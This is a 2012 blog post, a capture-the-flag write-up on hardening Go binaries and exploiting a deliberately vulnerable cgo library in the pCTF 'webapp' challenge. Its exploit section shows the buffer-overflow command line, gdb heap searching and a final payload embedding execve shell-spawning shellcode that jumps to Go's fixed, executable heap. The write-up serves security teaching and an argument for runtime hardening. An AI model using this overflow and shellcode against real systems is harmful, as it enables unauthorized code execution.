<!DOCTYPE html>
<html lang="en">
<head>
        <title>Code Arcana - exploitation</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" href="../theme/css/main.css" type="text/css" />
        <link href="../" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed" />
        

        <!--[if IE]>
                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

        <!--[if lte IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="../css/ie.css"/>
                <script src="../js/IE8.js" type="text/javascript"></script><![endif]-->

        <!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="../css/ie6.css"/><![endif]-->

</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="../index.html">Code Arcana </a></h1>
                <nav><ul>
                                    <li><a href="http://codearcana.com">Blog</a></li>
                                    <li><a href="http://codearcana.com">About Me</a></li>
                                                                                                </ul></nav>
        </header><!-- /#banner -->

                 <section id="content" class="body">
        <aside id="featured"><article>
                <h1 class="entry-title"><a href="../securing-and-exploiting-go-binaries.html">Securing and Exploiting Go&nbsp;Binaries</a></h1>
                <footer class="post-info">
        <abbr class="published" title="2012-05-06T00:00:00">
                Sun 06 May 2012
        </abbr>

                <address class="vcard author">
                By <a class="url fn" href="../author/alex-reece.html">Alex Reece</a>
        </address>
        <p>In <a href="../category/security.html">security</a>. </p>
<p>tags: <a href="../tag/golang.html">golang</a><a href="../tag/exploitation.html">exploitation</a></p></footer><!-- /.post-info --><!-- /.post-info -->
                <h3>Introduction</h3>

<p>
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source <a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz">here</a>). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go&nbsp;binary.
</p>

<h3>Securing a Go&nbsp;Binary</h3>

<p>
Creating a secure, production-ready Go binary was more challenging than expected. By default: <ul>
    <li>The Go build tools include the full path to the source on the build machine in the&nbsp;binary. </li>
    <li>Go binaries helpfully print the faulting address and instruction on segmentation&nbsp;faults.</li>
    <li>The heap in Go is loaded at a fixed address and is&nbsp;executable.</li>
    <li>Go binaries are linked with full debug&nbsp;information.</li>
</ul>
I filed a <a href="http://code.google.com/p/go/issues/detail?id=3467">issue</a> suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that&nbsp;yet.
</p>

<p>
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable <tt>GOROOT_FINAL</tt> before running <tt>all.bash</tt> (see <a href="http://code.google.com/p/go/issues/detail?id=3467#c4">this comment</a> on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a <tt>/tmp/build</tt> directory before compiling so that the only string was a <tt>&#8220;/tmp/build&#8221;</tt> rather than the actual&nbsp;path.
</p>

<p>
Some debug information can be stripped by passing <tt>-s</tt> as a command line to the linker (for example, <tt>go build -ldflags &#8220;-s&#8221; prog.go</tt>). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime&nbsp;soon.
</p>

<h3>Exploiting a Go&nbsp;program</h3>

<h4>Disclaimer</h4>

<p>
First things first - I did <em>not</em> find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags <tt>-fno-stack-protector -U_FORTIFY_SOURCE</tt> to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure&nbsp;Go.
</p>

<p>
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars <a href="https://github.com/banthar/gl">package</a> with Go bindings for OpenGl or a <a href="http://go-lang.cat-v.org/library-bindings">variety</a> of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go&nbsp;runtime.
</p>

<p>
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the <a href="webapp"><tt>webapp</tt></a> problem used in&nbsp;pCTF.
</p>

<h4>The actual&nbsp;exploit</h4>

<p>
The Go runtime has some really interesting properties that make it fun to exploit:
<ul>
    <li>The heap is&nbsp;executable.</li>
    <li>The heap is deterministic and in a fixed location every&nbsp;run</li>
    <li>Immutable strings tend to end up on the&nbsp;heap</li>
</ul>
We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a&nbsp;crash.
</p>

<div class="codehilite"><pre><span class="gp">$</span> ./webapp --loglevel<span class="o">=</span>2 --logfmt<span class="o">=</span><span class="s2">&quot;<span class="caps">AAAAAAAAA</span>%8d&quot;</span> --address<span class="o">=</span><span class="s2">&quot;:$(perl -e &#39;print &quot;</span>A<span class="s2">&quot;x109, &quot;</span><span class="caps">BBBB</span><span class="s2">&quot;&#39;)&quot;</span>
<span class="go"><span class="caps">AAAAAAAAA</span>       1Listening on :<span class="caps">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span></span>
<span class="go">unexpected fault address 0x42424242</span>
<span class="go">throw: fault</span>
<span class="go">[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]</span>

<span class="go">goroutine 1 [syscall]:</span>
<span class="go">levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)</span>
<span class="go">    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32</span>
<span class="go">levellog.Log(0x1, 0x1883cd00, 0x7f)</span>
<span class="go">    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140</span>
<span class="go">main.main()</span>
<span class="go">    /tmp/build/src/webapp/main.go:21 +0x101</span>

<span class="go">goroutine 2 [syscall]:</span>
<span class="go">created by runtime.main</span>
<span class="go">    /usr/local/src/go/src/pkg/runtime/proc.c:221</span>
</pre></div>


<p>Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we <tt>objdump</tt> the function and put a breakpoint before returning to our clobbered return&nbsp;address.</p>
<div class="codehilite"><pre><span class="mh">080624d0</span> <span class="p">&lt;</span><span class="nf">Log</span><span class="p">&gt;:</span>
<span class="x"> 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp</span>
<span class="x"> 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax</span>
<span class="x"> 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)</span>
<span class="x"> 80624e4:       e8 4f 00 00 00          call   8062538 &lt;__i686.get_pc_thunk.bx&gt;</span>
<span class="x"> 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx</span>
<span class="x"> 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)</span>
<span class="x"> 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi</span>
<span class="x"> 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)</span>
<span class="x"> 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax</span>
<span class="x"> 8062505:       89 34 24                mov    %esi,(%esp)</span>
<span class="x"> 8062508:       89 44 24 08             mov    %eax,0x8(%esp)</span>
<span class="x"> 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax</span>
<span class="x"> 8062512:       89 44 24 04             mov    %eax,0x4(%esp)</span>
<span class="x"> 8062516:       e8 ad 6c 25 00          call   82b91c8 &lt;sprintf@plt&gt;</span>
<span class="x"> 806251b:       89 34 24                mov    %esi,(%esp)</span>
<span class="x"> 806251e:       e8 b5 6c 25 00          call   82b91d8 &lt;puts@plt&gt;</span>
<span class="x"> 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx</span>
<span class="x"> 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi</span>
<span class="x"> 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp</span>
<span class="x"> 8062537:       c3                      ret</span>
</pre></div>


<p>and</p>
<div class="codehilite"><pre><span class="gp">$</span> gdb webapp
<span class="go"><span class="caps">GNU</span> gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08</span>
<span class="go">Copyright (C) 2011 Free Software Foundation, Inc.</span>
<span class="go">License GPLv3+: <span class="caps">GNU</span> <span class="caps">GPL</span> version 3 or later</span>
<span class="go">This is free software: you are free to change and redistribute it.</span>
<span class="go">There is <span class="caps">NO</span> <span class="caps">WARRANTY</span>, to the extent permitted by law.  Type &quot;show copying&quot;</span>
<span class="go">and &quot;show warranty&quot; for details.</span>
<span class="go">This <span class="caps">GDB</span> was configured as &quot;i686-linux-gnu&quot;.</span>
<span class="go">For bug reporting instructions, please see:</span>
<span class="go">...</span>
<span class="go">Reading symbols from /tmp/build/webapp...done.</span>
<span class="go">Loading Go Runtime support.</span>
<span class="go">(gdb) b *0x8062537</span>
<span class="go">Breakpoint 1 at 0x8062537</span>
</pre></div>


<p>We run our exploit again, and then search the heap for our string (we know that the heap is always in the range <tt>[0x18600000, 0x18900000]</tt> for this binary since Go has a deterministic&nbsp;heap).</p>
<div class="codehilite"><pre><span class="go">(gdb) run --loglevel=2 --logfmt=&quot;<span class="caps">AAAAAAAAA</span>%8d&quot; --address=&quot;:$(perl -e &#39;print &quot;A&quot;x109, &quot;<span class="caps">BBBB</span>&quot;&#39;)&quot;</span>
<span class="go">Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&quot;<span class="caps">AAAAAAAAA</span>%8d&quot; --address=&quot;:$(perl -e &#39;print &quot;A&quot;x109, &quot;<span class="caps">BBBB</span>&quot;&#39;)&quot;</span>
<span class="go">[Thread debugging using libthread_db enabled]</span>
<span class="go">[New Thread 0xb7ccbb70 (<span class="caps">LWP</span> 7869)]</span>
<span class="go"><span class="caps">AAAAAAAAA</span>       1Listening on :<span class="caps">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span></span>

<span class="go">Breakpoint 1, 0x08062537 in Log ()</span>
<span class="go">(gdb) x/a $esp</span>
<span class="go">0xbffff1ac: 0x42424242</span>
<span class="go">(gdb) find 0x18600000, 0x18900000, 0x42424242</span>
<span class="go">0x1883cd7b</span>
</pre></div>


<p>So now we know that our string, which is <tt>:<span class="caps">AAAA</span>&#8230;<span class="caps">AAAABBBB</span></tt>, is located at <tt>0x1883cd7b - 4 - 109 = 0x1883cd0e</tt> on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to&nbsp;it.</p>
<div class="codehilite"><pre><span class="gp">$</span> ./webapp -loglevel<span class="o">=</span>100 -logfmt<span class="o">=</span><span class="caps">AAAAAAAAA</span>%8d -address<span class="o">=</span><span class="s2">&quot;$(perl -e &#39; print &quot;</span>:<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>99<span class="se">\x</span>52<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>2d<span class="se">\x</span>70<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>52<span class="se">\x</span>6a<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>61<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>52<span class="se">\x</span>51<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>cd<span class="se">\x</span><span class="caps">80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="se">\x</span>0e<span class="se">\x</span>cd<span class="se">\x</span>83<span class="se">\x</span>18<span class="s2">&quot;&#39;)&quot;</span>
<span class="go"><span class="caps">AAAAAAAAA</span>       1Listening on :j</span>
<span class="go">                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½<span class="caps">RQS</span>ï¿½ï¿½Í€<span class="caps">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>Íƒ</span>
<span class="gp">$</span>
</pre></div>


<p><p>
Success!
</p>
<h3>Postmortem</h3>
<p>
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code&nbsp;execution.
</p></p>
<p>
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as <span class="caps">NX</span>, <span class="caps">ASLR</span>, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: <em>this binary is easily exploitable because it is a Go binary</em>, even assuming <span class="caps">ASLR</span>, <span class="caps">NX</span>, and libc&nbsp;randomization.
</p>

<p>
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the&nbsp;binary. 
</p>

<h3>Go Community&nbsp;Response</h3>

<p>
For anyone who is interested, the Go community&#8217;s response is <a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41">here</a>. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding <span class="caps">ASLR</span> or <span class="caps">NX</span> would not require very much&nbsp;effort.
</p>

<h3>Other&nbsp;writeups</h3>

<p>
There are writeups of this problem available by:
<ul>
    <li><a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/">Eindbazen</a> (C style return to libc&nbsp;exploit)</li>
    <li><a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html">w3stormz</a> (Go heap exploit, in&nbsp;French)</li>
</ul>
</p>

<h3>tl;dr</h3>

<p>
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively&nbsp;straightforward.
</p>

<p><span style="display:none;">Writeup by Alex Reece, see me on <a href="https://plus.google.com/106589059588263736517?rel=author">Google</a>+.</span> </p>
        </article></aside><!-- /#featured -->
            </ol><!-- /#posts-list -->
</section><!-- /#content -->

        <aside id="sidebar">
                <div class="widget">
                        <h2>Categories</h2>
                        <ul>
                                                   <li ><a href="../category/performance.html">performance</a></li>
                                                   <li ><a href="../category/security.html">security</a></li>
                                                </ul>
		</div>
		<div class="widget">
		    <h2>Tags</h2>
		    <ul class="cloud">
						<li class="tag-4">
			  <a href="../tag/profiling.html">profiling</a>
			</li>
						<li class="tag-4">
			  <a href="../tag/exploitation.html">exploitation</a>
			</li>
						<li class="tag-4">
			  <a href="../tag/mac-osx.html">mac osx</a>
			</li>
						<li class="tag-4">
			  <a href="../tag/malloc.html">malloc</a>
			</li>
						<li class="tag-4">
			  <a href="../tag/golang.html">golang</a>
			</li>
						<li class="tag-4">
			  <a href="../tag/reverse-engineering.html">reverse engineering</a>
			</li>
					    </ul>
		</div>


                        <div class="widget blogroll">
                        <h2>Blogroll</h2>
                        <ul>
                                                    <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
                                                    <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
                                                    <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
                                                </ul>
                </div><!-- /.blogroll -->
                                <div class="widget social">
                        <h2>Social</h2>
			<ul>
                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
                            
			    				<li><a href="https://twitter.com/awreece">twitter</a></li>
			    				<li><a href="https://github.com/awreece">github</a></li>
			    				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
			                            </ul>
                </div><!-- /.social -->
                </aside><!-- /#sidebar -->

        <footer id="footer" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="http://alexis.notmyidea.org/pelican/">pelican</a>, which takes great advantages of <a href="http://python.org">python</a>.
                </address><!-- /#about -->
        </footer><!-- /#footer -->

    <script type="text/javascript">
    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script>
    <script type="text/javascript">
    try {
        var pageTracker = _gat._getTracker("UA-40107691-1");
    pageTracker._trackPageview();
    } catch(err) {}</script>
</body>
</html>